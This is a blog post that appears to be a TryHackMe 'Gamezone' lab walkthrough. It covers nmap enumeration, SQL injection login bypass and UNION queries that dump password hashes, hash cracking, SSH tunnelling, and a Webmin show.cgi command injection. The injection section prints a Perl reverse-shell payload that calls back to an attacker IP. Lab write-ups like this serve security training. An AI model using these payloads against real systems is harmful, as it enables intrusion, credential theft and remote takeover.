<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="GamezoneDifficulty: Eazy→MediumScore: 4&#x2F;10">
<meta property="og:type" content="article">
<meta property="og:title" content="THM Gamezone">
<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[6].html">
<meta property="og:site_name" content="Kelpie Blog">
<meta property="og:description" content="GamezoneDifficulty: Eazy→MediumScore: 4&#x2F;10">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fh9HeE5jIEKvhgab7-qfthFK3Vew.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu7w8P2463JK_x3z-NPkUTiD0eKV.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoSXh2p9WHaCCo89H55-q-WTJe3_.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpHDiviKmWwTsnLaZR61pwO2ZFTE.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv1CaX3aiKKFv5IWF6YjHbc7pODU.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsArjyjf570EApkLh6SFVoIi6fOl.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fg12a49kXOUlipzsd1sh8Y2rx74b.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fug5f6oqqef3-bSN5s6jqjVYj1xV.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frn2apOVS7dzkkcP-1AxIFfsD2Ve.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv1nsbIJjy14WEA4Dbim04N9-GTL.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fihmxq-mhnbHr7xUB8KbenahSulm.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjqDmIG0ujJ0hOSMBYOf3cybve5_.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FipmQVjNxber7VLkVFOnNcBTuskm.png">
<meta property="article:published_time" content="2022-01-22T23:18:00.000Z">
<meta property="article:modified_time" content="2024-04-10T09:43:12.982Z">
<meta property="article:author" content="l3vi4th4n">
<meta property="article:tag" content="Penetration Test">
<meta property="article:tag" content="Try Hack Me">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fh9HeE5jIEKvhgab7-qfthFK3Vew.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>THM Gamezone</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B5%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B4%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[6].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&text=THM Gamezone"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&is_video=false&description=THM Gamezone"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=THM Gamezone&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[6].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&name=THM Gamezone&description=&lt;h1 id=&#34;Gamezone&#34;&gt;&lt;a href=&#34;#Gamezone&#34; class=&#34;headerlink&#34; title=&#34;Gamezone&#34;&gt;&lt;/a&gt;Gamezone&lt;/h1&gt;&lt;p&gt;Difficulty: Eazy→Medium&lt;br&gt;Score: 4&amp;#x2F;10&lt;/p&gt;
&lt;hr&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[6].html&t=THM Gamezone"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gamezone"><span class="toc-number">1.</span> <span class="toc-text">Gamezone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Runing-Nmap"><span class="toc-number">3.1.1.</span> <span class="toc-text">Runing Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection"><span class="toc-number">3.2.</span> <span class="toc-text">SQL injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-login-Control-and-command"><span class="toc-number">3.3.</span> <span class="toc-text">SSH login, Control and command</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firewall-bypass"><span class="toc-number">3.4.</span> <span class="toc-text">Firewall bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.5.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        THM Gamezone
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">l3vi4th4n</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-01-22T23:18:00.000Z" class="dt-published" itemprop="datePublished">2022-01-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>, <a class="p-category" href="/tags/Try-Hack-Me/" rel="tag">Try Hack Me</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Gamezone"><a href="#Gamezone" class="headerlink" title="Gamezone"></a>Gamezone</h1><p>Difficulty: Eazy→Medium<br>Score: 4&#x2F;10</p>
<hr>
<span id="more"></span>

<h1 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h1><ol>
<li>2 flags</li>
<li>system privilege</li>
</ol>
<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Runing-Nmap"><a href="#Runing-Nmap" class="headerlink" title="Runing Nmap"></a>Runing Nmap</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-oA</span> Gamezone <span class="token number">10.10</span>.192.4
output:
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.79.249
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed ports
PORT STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span> <span class="token function">ssh</span> OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.7 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey:
<span class="token operator">|</span> <span class="token number">2048</span> <span class="token number">61</span>:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span> <span class="token number">256</span> b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_ <span class="token number">256</span> <span class="token number">53</span>:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span> http Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-cookie-flags:
<span class="token operator">|</span> /:
<span class="token operator">|</span> PHPSESSID:
<span class="token operator">|</span>_ httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Game Zone
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
<span class="token comment"># Nmap done at Tue Apr 28 17:59:50 2020–1 IP address (1 host up) scanned in 40.81 seconds</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Since we have no credentials at the moment to bruteforce or login to SSH, we will just start to connect to the website running on port 80.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fh9HeE5jIEKvhgab7-qfthFK3Vew.png"><br>We can see the form of Login</p>
<pre class="line-numbers language-none"><code class="language-none">Username: &#39; or 1&#x3D;1 -- -
Password: plain
Username: admin
Password: &#39; or 1&#x3D;1 -- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><p>After that we login<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fu7w8P2463JK_x3z-NPkUTiD0eKV.png"><br>We can use SQLMAP or manunal SQL injection, here I choose manual SQL injection.</p>
<pre class="line-numbers language-none"><code class="language-none">&#39; union select 1,2,3 — -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoSXh2p9WHaCCo89H55-q-WTJe3_.png"><br>This is what is returned, the 1 you cant see, but its fine. We can work with this.<br>We now want to see what databases we can find in this mySQL.</p>
<pre class="line-numbers language-none"><code class="language-none">&#39; union select 1,2, schema_name FROM information_schema.schemata; — -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpHDiviKmWwTsnLaZR61pwO2ZFTE.png"><br>5 databases we get in return, the bad news is that like half of them are default. The good news is that db is most likely the one we actually need.<br>We are going to now try to get the tables that reside inside of the ‘db’ database</p>
<pre class="line-numbers language-none"><code class="language-none">‘ union select 1,2, TABLE_NAME FROM information_schema.TABLES WHERE table_schema&#x3D;’db’; — -
&#x2F;&#x2F; Get tables name
‘ union select 1,table_name, column_name FROM information_schema.columns WHERE table_name &#x3D; ‘users’ ; — -
&#x2F;&#x2F; Get columns name
‘ union select 1, username , pwd from users; — -
Output:
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218fxxxxxxxxxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We can crash it by john or we can copy the hash to random website and see if works.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218fxxxxxxxxxxxx'</span> <span class="token operator">></span> passwd.hash
john passwd.hash <span class="token parameter variable">--wordlist</span><span class="token operator">=~</span>/Desktop/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="SSH-login-Control-and-command"><a href="#SSH-login-Control-and-command" class="headerlink" title="SSH login, Control and command"></a>SSH login, Control and command</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> agent47@10.10.192.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>After we login in, to see what ports are listening</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ss <span class="token parameter variable">-tulpn</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv1CaX3aiKKFv5IWF6YjHbc7pODU.png"></p>
<h2 id="Firewall-bypass"><a href="#Firewall-bypass" class="headerlink" title="Firewall bypass"></a>Firewall bypass</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsArjyjf570EApkLh6SFVoIi6fOl.png"></p>
<blockquote>
<p>Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.<br><strong>-L</strong> is a local tunnel (YOU &lt;– CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do **ssh -L 9000:imgur.com:80 **<a href="mailto:user@example.com"><strong>user@example.com</strong></a>**.** Going to localhost:9000 on your machine, will load imgur traffic using your other server.<br>**-R** is a remote tunnel (YOU –&gt; CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.</p>
</blockquote>
<p>From our local machine, run <strong>ssh -L 10000:localhost:10000 <username>@<ip></strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-L</span> <span class="token number">10000</span>:localhost:10000 agent47@10.10.192.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Now, what this does is put the victims port 10000 on your machine. You reach it by doing</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Going to that page we see a login, and using the same credentials we already have, we can log in just fine.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fg12a49kXOUlipzsd1sh8Y2rx74b.png"><br>Digging into this exploit, I found the official documentation of it</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf">http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf</a></p>
</blockquote>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fug5f6oqqef3-bSN5s6jqjVYj1xV.png"><br>The documentation shows that adding &#x2F;file&#x2F;show.cgi to the URL allows you to read file locations (as root) when adding a file past the ‘show.cgi’<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frn2apOVS7dzkkcP-1AxIFfsD2Ve.png"><br>We can use it to create the reverse shell</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcpdump <span class="token parameter variable">-i</span> tun0 icmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv1nsbIJjy14WEA4Dbim04N9-GTL.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://localhost:10000/file/show.cgi/show.cgi/bin/A<span class="token operator">|</span>ping%20-c%203%2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>You IP address<span class="token operator">>|</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fihmxq-mhnbHr7xUB8KbenahSulm.png"><br>Perl reverse shell</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">http://localhost:10000/file/show.cgi/bin/4uIPiqNld|perl%20-e%20'use%20Socket;$i=%2210.4.4.98%22;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&amp;S%22);open(STDOUT,%22%3E&amp;S%22);open(STDERR,%22%3E&amp;S%22);exec(%22/bin/sh%20-i%22);%7D;'|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjqDmIG0ujJ0hOSMBYOf3cybve5_.png"><br>We can also do that!<br>Next I know that the root flag is in the root directory, so I just went to it on the URL<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FipmQVjNxber7VLkVFOnNcBTuskm.png"></p>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gamezone"><span class="toc-number">1.</span> <span class="toc-text">Gamezone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Target"><span class="toc-number">2.</span> <span class="toc-text">Target</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">3.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Runing-Nmap"><span class="toc-number">3.1.1.</span> <span class="toc-text">Runing Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection"><span class="toc-number">3.2.</span> <span class="toc-text">SQL injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-login-Control-and-command"><span class="toc-number">3.3.</span> <span class="toc-text">SSH login, Control and command</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Firewall-bypass"><span class="toc-number">3.4.</span> <span class="toc-text">Firewall bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.5.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[6].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&text=THM Gamezone"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&is_video=false&description=THM Gamezone"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=THM Gamezone&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[6].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&title=THM Gamezone"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[6].html&name=THM Gamezone&description=&lt;h1 id=&#34;Gamezone&#34;&gt;&lt;a href=&#34;#Gamezone&#34; class=&#34;headerlink&#34; title=&#34;Gamezone&#34;&gt;&lt;/a&gt;Gamezone&lt;/h1&gt;&lt;p&gt;Difficulty: Eazy→Medium&lt;br&gt;Score: 4&amp;#x2F;10&lt;/p&gt;
&lt;hr&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[6].html&t=THM Gamezone"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    l3vi4th4n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
